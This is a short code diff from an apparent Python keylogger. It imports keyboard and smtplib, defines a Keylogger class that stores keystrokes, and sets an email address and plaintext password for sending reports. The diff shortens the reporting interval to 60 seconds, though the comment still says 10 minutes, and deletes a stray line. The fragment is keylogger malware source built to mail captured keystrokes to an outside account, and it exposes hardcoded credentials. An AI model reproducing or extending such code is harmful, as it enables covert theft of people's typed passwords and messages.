@@ -2,7 +2,7 @@ import keyboard
 import smtplib
 from threading import Semaphore, Timer
 
-SEND_REPORT_EVERY = 600 # 10 minutes
+SEND_REPORT_EVERY = 60 # 10 minutes
 EMAIL_ADDRESS = "BergCyberSectesting@gmail.com"
 EMAIL_PASSWORD = "P0ggersBerg"
 
@@ -10,7 +10,6 @@ class Keylogger:
     def __init__(self, interval):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval 
-        self.
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
         self.log = ""
